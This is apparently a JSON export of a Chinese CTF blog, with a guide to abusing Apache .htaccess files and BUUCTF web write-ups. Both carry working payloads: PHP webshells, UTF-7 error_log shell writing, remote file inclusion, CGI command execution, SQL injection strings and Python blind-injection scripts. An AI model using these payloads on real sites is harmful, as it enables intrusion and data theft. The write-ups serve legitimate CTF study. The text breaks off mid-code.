[{"content":"hello world 666\n111\n","date":"2025-07-07T18:48:57+08:00","permalink":"https://0d000721999.github.io/p/test/","title":"Test"},{"content":"Apache的.htaccess利用技巧 参考：Apache的.htaccess利用技巧-先知社区\n作用范围 .htaccess 文件中的配置指令作用于 .htaccess 文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有 .htaccess 文件，而指令是按查找顺序依次生效的，所以一个特定目录下的 .htaccess 文件中的指令可能会覆盖其上级目录中的 .htaccess 文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。\n配置文件 启动 .htaccess，需要在服务器的主配置文件将 AllowOverride 设置为 All，如 apache2.conf\n1 AllowOverride All #启动.htaccess文件的使用 也可以将 .htaccess 修改为其他名\n1 AccessFileName .config #将.htaccess修改为.config 常见指令 具体功能可以看http://www.htaccess-guide.com/\nSetHandler SetHandler 可以强制所有匹配的文件被一个指定的处理器处理 用法：\n1 SetHandler handler-name|None 示例1：\n1 SetHandler application/x-httpd-php 此时当前目录及其子目录下所有文件都会被当做 php 解析\n示例2：\n1 SetHandler server-status apache的服务器状态信息(默认关闭)，可以查看所有访问本站的记录\n访问任意不存在的文件，加参数 ?refresh=5 来实现每隔 5s 自动刷新\n比如sever?refresh=5\nAddHandler AddHandler 可以在文件扩展名与特定的处理器之间建立映射 用法:\n1 AddHandler handler-name extension [extension] ... 例如：\n1 AddHandler cgi-script .xxx 将扩展名为 .xxx 的文件作为 CGI 脚本来处理\nAddType AddType 可以将给定的文件扩展名映射到指定的内容类型 用法：\n1 AddType media-type extension [extension] ... 示例：\n1 AddType application/x-httpd-php .gif 将以 gif 为后缀的文件当做 php 解析\n1 AddType application/x-httpd-php png jpg gif 将以 .png .jpg .gif 多个后缀当做 php 解析\nphp_value 当使用 PHP 作为 Apache 模块时，也可以用 Apache 的配置文件（例如 httpd.conf）和 .htaccess 文件中的指令来修改 php 的配置设定。需要有AllowOverride Options 或AllowOverride All 权限才可以。\nphp_value 设定指定的值。要清除先前设定的值，把 value 设为 none。不要用 php_value 设定布尔值。应该用 php_flag。\n用法：\n1 php_value name value PHP: 配置可被设定范围 - Manual\n由上可知 .htaccess 只能用于 PHP_INI_ALL 或 PHP_INI_PERDIR 类型的指令。\nPHP: php.ini 配置选项列表 - Manual\n可以找到可用指令\n(1) 文件包含配置选项\nauto_prepend_file：在主文件解析之前自动解析包含的文件 auto_append_file：在主文件解析后自动解析包含的文件 例如:\n1 php_value auto_prepend_file images.png 访问一个 php 文件时，在该文件解析之前会先自动解析 images.png 文件\n(2) 绕过preg_match\n例如：\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。\nphp_flag php_flag 用来设定布尔值的 php 配置指令 用法：\n1 php_flag name on|off PHP: php.ini 配置选项列表 - Manual\n找到可用指令\n可以将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露\n1 php_flag engine 0 利用方式 文件解析 经常出现在文件上传的黑名单没有限制 .htaceess 后缀，通过上传 .htaccess 文件，再上传图片，使图片的 php 恶意代码得以被解析执行\n.htaccess 文件内容有如下两种\n1.SetHandler 指令\n1 2 3 4 # 将images.png 当做 PHP 执行 \u0026lt;FilesMatch \u0026#34;images.png\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 2.AddType\n1 2 # 将 .jpg 当做 PHP 文件解析 AddType application/x-httpd-php .jpg 文件包含 本地文件包含 通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 php 文件来触发。\n.htaccess 分别通过这两个配置选项来包含 /etc/passwd,并访问同目录下的 index.php文件。\nauto_prepend_file\n1 php_value auto_prepend_file /etc/passwd auto_append_file\n1 php_value auto_append_file /etc/passwd 远程文件包含 PHP 的 all_url_include 配置选项这个选项默认是关闭的，如果开启的话就可以远程包含。因为 all_url_include 的配置范围为 PHP_INI_SYSTEM,所以无法利用 php_flag 在 .htaccess 中开启。\n在 php.ini 中设置 all_url_include 为 On\n1 php_value auto_append_file http://10.87.9.156/phpinfo.txt 然后访问目录下php文件后就会出现phpinfo\n源码泄露 利用 php_flag 将 engine 设置为 0,在本目录和子目录中关闭 php 解析,造成源码泄露\n1 php_flag engine 0 这里在谷歌浏览器访问会显示源码，用其他浏览器访问会显示空白，还需查看源码，才可看到泄露的源码\n代码执行 1.利用伪协议 all_url_fopen、all_url_include 为 On\n1 2 php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== #php_value auto_append_file data://text/plain,\u0026lt;?php phpinfo(); 2.解析.htaccess 方法一：\n1 2 php_value auto_append_file .htaccess #\u0026lt;?php phpinfo(); 解析完会变成\n1 2 php_value auto_append_file .htaccess # 下面把phpinfo解析了 方法二： 这种适合同目录或子目录没有 php 文件。 需要先设置允许可访问 .htaccess 文件\n1 2 3 4 5 \u0026lt;Files ~ \u0026#34;^.ht\u0026#34;\u0026gt; Require all granted Order allow,deny Allow from all \u0026lt;/Files\u0026gt; 然后再将 .htaccess指定当做 php文件处理\n1 2 SetHandler application/x-httpd-php # \u0026lt;?php phpinfo(); ?\u0026gt; 最后会被解析为\n1 2 Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php # 下面phpinfo被解析了 命令执行 CGI启动 cgi_module 需要加载，即 apache 配置文件中有\n1 LoadModule cgi_module modules/mod_cgi.so .htaccess内容\n1 2 Options ExecCGI #允许CGI执行 AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析 ce.xx内容（弹计算器\n1 2 #!C:/Windows/System32/cmd.exe /k start calc.exe 6 例题可看 [De1CTF2020 check in](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check in)\nDe1CTF2020 check in 预期解\n.htaccess:\n1 2 Options +ExecCGI AddHandler cgi-script .xx 1.xx:\n1 2 3 4 5 6 7 #! /bin/bash echo Content-type: text/html echo \u0026#34;\u0026#34; cat /flag 注：这里讲下一个小坑，linux中cgi比较严格 上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。\n非预期解\n反斜杠绕过正则\n.htaccess:\n1 2 AddType application/x-httpd-p\\ hp .xx 1.xx\n1 \u0026lt;?=\u0026#39;cat /flag\u0026#39;; 或者白嫖flag\n利用apache的服务器状态信息(默认关闭) .htaccess:\n1 SetHandler server-status 上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录\nFastCGI启动 mod_fcgid.so需要被加载。即 apache 配置文件中有\n1 LoadModule fcgid_module modules/mod_fcgid.so .htaccess\n1 2 3 Options +ExecCGI AddHandler fcgid-script .xx FcgidWrapper \u0026#34;C:/Windows/System32/cmd.exe /k start calc.exe\u0026#34; .xx ce.xx内容随便填，就能弹计算器了\nXSS highlight_file .htaccess\n1 php_value highlight.comment \u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#39; 其中的 highlight.comment 也可以换成如下其他选项\nPHP: 运行时配置 - Manual\nindex.php\n1 2 3 \u0026lt;?php highlight_file(__FILE__); // comment 就会弹xss\n错误消息链接 index.php ：\n1 2 \u0026lt;?php include(\u0026#39;foo\u0026#39;);#foo报错 .htaccess\n1 2 3 php_flag display_errors 1 php_flag html_errors 1 php_value docref_root \u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\u0026#34; 利用报错来xss\n自定义错误文件 error.php\n1 \u0026lt;?php include(\u0026#39;shell\u0026#39;);#报错页面 .htaccess\n1 2 php_value error_log /tmp/www/html/shell.php php_value include_path \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; 访问 error.php，会报错并记录在 shell.php 文件中\n因为\u0026lt;?标签会经过 html 编码，所以需要 UTF-7 来绕过。\n.htaccess\n1 2 3 4 5 6 7 8 9 # 第一次 php_value error_log /tmp/shell #定义错误路径 #---- \u0026#34;\u0026lt;?php phpinfo(); __halt_compiler();\u0026#34; in UTF-7: php_value include_path \u0026#34;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # 第二次 php_value include_path \u0026#34;/tmp\u0026#34; #将include()的默认路径改变 php_flag zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; 这种方法在这题有记录：OurChallenges/XNUCA2019Qualifier/Web/Ezphp at master · NeSE-Team/OurChallenges · GitHub\nXNUCA2019 ezphp 预期解\nhtaccess生效\n如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用# \\的方式将换行符转义成普通字符，就可以用#来注释单行了。\n利用文件包含\n代码中有一处include_once(\u0026quot;fl3g.php\u0026quot;);，php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。\ntmp目录写文件\n如何在指定目录写指定文件名的文件呢？php的配置选项中有error_log可以满足这一点。error_log可以将php运行报错的记录写到指定文件中。 如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。 写进error_log的内容会被html编码怎么绕过？这个点是比较常见的，采用utf7编码即可。 payload\n第一步，通过error_log配合include_path在tmp目录生成shell 1 2 3 4 php_value error_log /tmp/fl3g.php php_value error_reporting 32767 php_value include_path \u0026#34;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs\u0026#34; # \\ 第二步，通过include_path和utf7编码执行shell 1 2 3 4 php_value include_path \u0026#34;/tmp\u0026#34; php_value zend.multibyte 1 php_value zend.script_encoding \u0026#34;UTF-7\u0026#34; # \\ 非预期1\n因为正则判断写的是if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) == 1) {而不是if(preg_match(\u0026quot;/[^a-z\\.]/\u0026quot;, $filename) !== 0) {，因此存在了被绕过的可能。 通过设置.htaccess\n1 2 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。\n非预期2\n反斜杠绕过\n1 2 php_value auto_prepend_fi\\ le \u0026#34;.htaccess\u0026#34; 脚本\n1 2 3 4 5 6 7 8 9 10 11 12 import requests htaccess = \u0026#39;\u0026#39;\u0026#39;php_value auto_prepend_fi\\\\ le \u0026#34;.htaccess\u0026#34; %23\u0026lt;?php system(\u0026#39;cat /????\u0026#39;);?\u0026gt;\\\\\u0026#39;\u0026#39;\u0026#39; url = \u0026#39;http://ddd0daaf-fee4-4af5-b7bb-9f0d7dfbe6ef.node5.buuoj.cn:81/?filename={}\u0026amp;content={}\u0026#39;.format(\u0026#39;.htaccess\u0026#39;, htaccess) r = requests.get(url=url) print(r.status_code) print(r.text) ","date":"2025-04-06T00:00:00Z","image":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.png","permalink":"https://0d000721999.github.io/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/","title":"Apache的.htaccess利用技巧"},{"content":"buuctf 1、[极客大挑战 2019]EasySQL 进去猜闭合方式\n单引号闭合\n尝试万能密码登入\n1 2 username=1\u0026#39; or true# password=1\u0026#39; or true# 2、[极客大挑战 2019]Havefun 查看源码要get传cat的值为dog\n1 ?cat=dog 3、[HCTF 2018]WarmUp 查看源码source.php\n白名单只有source.php和hint.php,文件包含传file参数,且有?截断\n查看hint.php\n1 http://347210bf-0468-4578-89c6-04af275f9312.node5.buuoj.cn:81/source.php?file=source.php?../../../../../ffffllllaaaagggg 往上跳目录查找\n4、[ACTF2020 新生赛]Include 题目提示了文件包含，要查看flag.php文件\n用到php伪协议封装\n1 php://filter/read=convert.base64-encode/resource=xxx.php 这题直接\n1 /?file=php://filter/read=convert.base64-encode/resource=flag.php 然后base64解码\n就得到flag\n5、[ACTF2020 新生赛]Exec 简单的rce\n1 2 ip;ls / ip;cd /;cat /flag 6、[GXYCTF2019]Ping Ping Ping 尝试了好久感觉flag名字被过滤了，还有空格过滤\n先查看index.php\n1 http://41313055-4ac6-4251-8b42-bee9bd416efc.node5.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9index.php 方法一：变量拼接字符串——将a的值覆盖，然后进行绕过 1 /?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php 然后查看源码得到flag\n方法二：内联执行 内联函数：将指定的函数体插入并取代每一处调用该函数的地方。\n反引号在linux中作为内联执行，执行输出结果。也就是说\n1 cat `ls` //执行ls输出 index.php 和 flag.php 。然后再执行 cat flag.php;cat index.php 1 /?ip=127.0.0.1;cat$IFS$9`ls` 方法三：sh命令来执行 加密命令 echo “cat flag.php” | base64 解密命令并执行 echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh\n1 /?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh 7、[SUCTF 2019]EasySQL 尝试很多闭合方式都回显nonono\n尝试堆叠注入\n1 2 1;show databases; 1;show tables; 可以看到flag应该在Flag表中\n输入非0数字\u0026ndash;有会显，输入0或字母\u0026ndash;没有回显\n由此可以猜测后端代码含有||或or运算符\n1 2 3 4 5 6 7 select command1 || command2 情况一：若command1为非0数字，则结果为1。 情况二：若command1为0或字母，command2为非0数字，则结果为1。 情况三：command1和command2都不为非0数字，则结果为0。 方法一：使用 sql_mode 中的 PIPES_AS_CONCAT 函数 PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。\nselect 1 || flag from Flag的意思将变成 先查询1 再查询 flag，而不是查询1flag,只是查询的结果会拼接到一起\n1 1;sql_mode=PIPES_AS_CONCAT;select 1 方法二：利用非预期漏洞获取flag 若输入1，1。那么sql语句就变成了 select 1, 1 || flag from Flag。其中由 [1] 和 [1 || flag] 两部分组成，而非 [1,1] || [flag]。非预期漏洞是利用数据库对符号判断的不准确形成的漏洞。\n1 *,1 输入 *，1 后，sql语句就变成了 select * , 1 || flag from Flag。\n其中分为两部分： (1) select * from Flag(2) select 1 || flag from Flag。\n8、[极客大挑战 2019]LoveSQL 单引号闭合\n尝试联合注入\n1 -1\u0026#39; union select 1,database(),version()# 爆出数据库名是geek\n1 2 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()# 1 2 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;l0ve1ysq1\u0026#39;# 1 2 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from l0ve1ysq1)# 然后查看源码就得到flag\n9、[强网杯 2019]随便注 闭合方式为单引号\n后面联合查询回显了过滤的字符\n用堆叠注入\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 出来两个表\n1 2 1\u0026#39;; show columns from words;# 1\u0026#39;; show columns from `1919810931114514`;# 这边注意数字要用`反引号包起来\n数字表中有flag\npayload\n1 2 3 4 5 6 7 8 9 1\u0026#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);# 1，通过 rename 先把 words 表改名为其他的表名。 2，把 1919810931114514 表的名字改为 words 。 3 ，给新 words 表添加新的列名 id 。 4，将 flag 改名为 data 。 或者\n1 2 3 4 1’;rename tables words to words1;rename tables 1919810931114514 to words; alter table words change flag id varchar(100);# 将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id 然后用1’ or 1=1 #得到flag 解法二\n因为select被过滤了，所以先将select * from 1919810931114514进行16进制编码\n1 2 3 4 5 6 7 8 9 10 11 12 payload 先把0xselect * from `1919810931114514` 16进制编码 1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值，如下： 复制代码 代码如下: SELECT @VAR1=‘Y’,@VAR2=‘N’ – 而SET要达到同样的效果，需要： SET @VAR1=‘Y’ SET @VAR2=‘N’ prepare…from…是预处理语句，会进行编码转换。 execute用来执行由SQLPrepare创建的SQL语句 解法三\n用handler命令查看，\n1 2 3 4 5 1\u0026#39;; handler 1919810931114514 open as a;handler a read next;# handler代替select，以一行一行显示内容 open打开表 as更改表的别名为a read next读取数据文件内的数据次数 10、[极客大挑战 2019]Secret File 查看源码，发现其他php文件\nend.php前面的文件抓包\n发现secr3t.php\n访问flag.php\n用前面Include的方法php伪协议\n1 /secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php 11、[极客大挑战 2019]Http 查看源码发现Secret.php\nIt doesn’t come from ‘https://www.Sycsecret.com’，也就是说这个页面得来自https://www.Sycsecret.com，添加referer即可\n添加User-Agent:Syclover\n添加X-Forwarded-For:127.0.0.1\n12、[极客大挑战 2019]Upload 要求上传图片，我们把文件类型改为image/jpeg\n下面补上GIF89a\n上传的内容被识别出\u0026lt;?要改为\n1 \u0026lt;script language=\u0026#39;php\u0026#39;\u0026gt;@eval($_POST[\u0026#39;cmd\u0026#39;]);\u0026lt;/script\u0026gt; 然后尝试等价后缀名，最后phtml上传成功，进upload目录，蚁剑连接\n13、[极客大挑战 2019]Knife 蚁剑连接\n14、[ACTF2020 新生赛]Upload 前端验证把onsubmit删掉，后面跟12题一样\n15、[极客大挑战 2019]BabySQL 单引号闭合，然后很多被过滤了，都用双写绕过,check.php后拼接\n1 username=1%27%20ununionion%20seselectlect%201,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema=%27ctf%27%23\u0026amp;password=1 16、[极客大挑战 2019]PHP www.zip下载源码\n反序列化\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Name{ private $username = \u0026#39;admin\u0026#39;; private $password = \u0026#39;100\u0026#39;; } $select = new Name(); echo serialize($select); 把结果的奇怪符号用%00代替，%00是空格的url编码\n17、[ACTF2020 新生赛]BackupFile php弱比较key=123\n18、[RoarCTF 2019]Easy Calc 源码里面查看calc.php\nnum传参只能传数字，但是我们用+num或者空格num就能传字符，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。\n过滤/，我们用chr(47)绕过，phpinfo();看到禁用system,用var_dump(scandir(/))\n看到flag是f1agg\n1 +num=1;var_dump(file_get_contents(chr(47).f1agg)) 19、[极客大挑战 2019]BuyFlag 密码弱比较，money用1e9或者money[]=1数组绕过，cookie里面user改为1\n20、BJDCTF2020]Easy MD5 打开网络，看到hint\n1 select * from \u0026#39;admin\u0026#39; where password=md5($pass,true) 要在password这里拼接一个or 1就可以使结果为真\nmd5加密后得到hash值，sql语句会把hex值转为ascii\nffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ' or '6\n拼接后结果也为真\n计算脚本\n1 2 3 4 5 6 7 8 \u0026lt;?php for ($i = 0;;) { for ($c = 0; $c \u0026lt; 1000000; $c++, $i++) if (stripos(md5($i, true), \u0026#39;\\\u0026#39;or\\\u0026#39;\u0026#39;) !== false) echo \u0026#34;\\nmd5($i) = \u0026#34; . md5($i, true) . \u0026#34;\\n\u0026#34;; echo \u0026#34;.\u0026#34;; } ?\u0026gt; md5函数 md5 函数通常用于计算输入字符串的 MD5 哈希值。md5(string, raw) 这种形式的函数调用中，string 是需要进行哈希计算的输入字符串，而 raw 是一个布尔类型的参数，用于指定返回的哈希值的格式。\nstring：这是必需的参数，代表要进行 MD5 哈希计算的原始字符串数据。可以是任意长度的文本信息，例如用户密码、文件内容等。 raw：这是一个可选参数，不同编程语言对该参数的处理和含义可能有所不同，但一般来说： 当 raw 为 true 或者类似表示真的值时，函数会返回原始的 128 位（16 字节）二进制格式的哈希值。 当 raw 为 false 或者类似表示假的值时，函数会返回以 32 位十六进制字符串形式表示的哈希值。 接下来是md5弱比较,开头为0e就行\n1 2 3 4 5 6 7 MAUXXQC 0e478478466848439040434801845361 IHKFRNS 0e256160682445802696926137988570 GZECLQZ 0e537612333747236407713628225676 GGHMVOE 0e362766013028313274586933780773 GEGHBXL 0e248776895502908863709684713578 EEIZDOI 0e782601363539291779881938479162 DYAXWCA 0e424759758842488633464374063001 然后是md5强比较，数组绕过\n1 2 3 4 5 param1[]=1\u0026amp;param2[]=2 或者确实有a!=b但是MD5值相同的 param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\u0026amp;param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 或者 a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 21、[HCTF 2018]admin 随便注册账号有个修改密码的选项\n查看源码\n这里有一个链接但是失效了，网上找别人的wp,得到secret_key=ckj123，需要伪造session\n然后改session,得到flag\nunicode欺骗，源码里面有strlower函数，我们创建一个大写的ADMIN账户，会被编译成小写的，然后修改密码就能登入，但随后发现注册和登录都用了转小写，注册ADMIN的计划失败\n1 2 3 def strlower(username): username = nodeprep.prepare(username) return username 这里的nodeprep.prepare存在漏洞\nᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ这种编码会先转为大写的，再转为小写，就能伪造admin\n1 ᴀ -\u0026gt; A -\u0026gt; a 注册用户ᴀdmin 登录用户ᴀdmin，变成Admin 修改密码Admin，更改了admin的密码 22、[MRCTF2020]你传你🐎呢 传.htaccess文件把jpg转为php，抓包改文件格式，这里jpg不行要用png，上传蚁剑连接\n23、[ZJCTF 2019]NiZhuanSiWei text用data传值，然后file传useless.php看php内容\n还有一个password要反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php class Flag{ //flag.php public $file=\u0026#34;flag.php\u0026#34;; public function __tostring(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; return (\u0026#34;U R SO CLOSE !///COME ON PLZ\u0026#34;); } } } $a=new Flag(); echo serialize($a); ?\u0026gt; 24、[极客大挑战 2019]HardSQL 空格和/**/被过滤了，用（）绕过，用报错注入\n1 2 3 4 username=1\u0026#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))),0x7e),1))#\u0026amp;password=1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flag显示不全，substring被过滤，只能用left和right构造\n1 username=1\u0026#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\u0026amp;password=1 flag{8c32c5d2-2601-4575-b121-a16d5f8c0d2e}\n[网鼎杯 2020 青龙组]AreUSerialz 两种解法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php class FileHandler { protected $op=2; protected $filename=\u0026#39;flag.php\u0026#39;; protected $content; } $o = new FileHandler(); $o = urlencode(serialize($o));//有不可打印字符但又不能丢弃，url编码 $o =str_replace(\u0026#39;%00\u0026#39;,\u0026#39;\\00\u0026#39;,$o); //因为检测函数要求字符在ascii码32-125，但是%00不在范围内，要改成\\00 $o =str_replace(\u0026#39;s\u0026#39;,\u0026#39;S\u0026#39;,$o); //改为\\00后，反序列化后不会识别\\00，小写s表示字符串,大写S表示16进制字符串 echo $o; ?\u0026gt; 利用当PHP版本 \u0026gt;= 7.2 时，反序列化对访问类别不敏感。\n直接改为public,读取base64编码后的flag.php\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class FileHandler { public $op=2; public $filename=\u0026#39;php://filter/convert.base64-encode/resource=flag.php\u0026#39;; public $content; } $o = new FileHandler(); echo $o = urlencode(serialize($o)); ?\u0026gt; [GXYCTF2019]BabySQli exp\n1 2 \u0026#39; union select 1,\u0026#39;admin\u0026#39;, \u0026#39; 202cb962ac59075b964b07152d234b70 \u0026#39;# 123 源码这里有提示\n联合注入，第二位要填admin，第三位填加密后的password\n[GYCTF2020]Blacklist 堆叠注入\n单引号闭合\n1 1\u0026#39;;show databases;# 1 1\u0026#39;;show tables;# 1 1\u0026#39;;show columns from FlagHere;# 这里想用之前的rename,编码转换都不行\n用handler语句\n1 2 3 4 handler table_name open;handler table_name read first;handler table_name close; handler table_name open;handler table_name read next;handler table_name close; 首先打开数据库，开始读它第一行数据，读取成功后进行关闭操作。 首先打开数据库，开始循环读取，读取成功后进行关闭操作。 或者直接用之前的payload\n1 1\u0026#39;;handler FlagHere open as a;handler a read next;# [CISCN2019 华北赛区 Day2 Web1]Hack World sql注入，但是过滤空格和联合注入，报错注入，用盲注\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests import time import re url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): s = (int)((max+min)/2) payload = \u0026#39;1^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(s)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello, glzjin wants a girlfriend.\u0026#39; in str(r.content): max=s else: min=s if((max-min)\u0026lt;=1): flag+=chr(max) break print(flag) 这里因为是or被过滤用异或符号替代\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import time url=\u0026#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1,43): max = 127 min = 0 for c in range(0,127): n = (int)((max+min)/2) payload = \u0026#39;0^(ascii(substr((select(flag)from(flag)),\u0026#39;+str(i)+\u0026#39;,1))\u0026gt;\u0026#39;+str(n)+\u0026#39;)\u0026#39; r = requests.post(url,data = {\u0026#39;id\u0026#39;:payload}) time.sleep(0.005) if \u0026#39;Hello\u0026#39; in str(r.content): min=n else: max=n if((max-min)\u0026lt;=1): flag+=chr(max) print(\u0026#34;\\r\u0026#34;, end=\u0026#34;\u0026#34;) print(flag,end=\u0026#39;\u0026#39;) break [RoarCTF 2019]Easy Java 点help，发现没什么用，抓包改post\n下载下来没用，由于题目名称是java，想到下载web.xml\n下载后面这个class类\n可以下载下来反编译或者这里就直接有base64编码的字符串\n[BSidesCF 2020]Had a bad day 这题主要是用到php://filter伪协议可以套一层协议\n1 category=php://filter/convert.base64-encode/resource=index.php 可以看到自动拼接了php后缀\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $file = $_GET[\u0026#39;category\u0026#39;]; if(isset($file)) { if( strpos( $file, \u0026#34;woofers\u0026#34; ) !== false || strpos( $file, \u0026#34;meowers\u0026#34; ) !== false || strpos( $file, \u0026#34;index\u0026#34;)){ include ($file . \u0026#39;.php\u0026#39;); } else{ echo 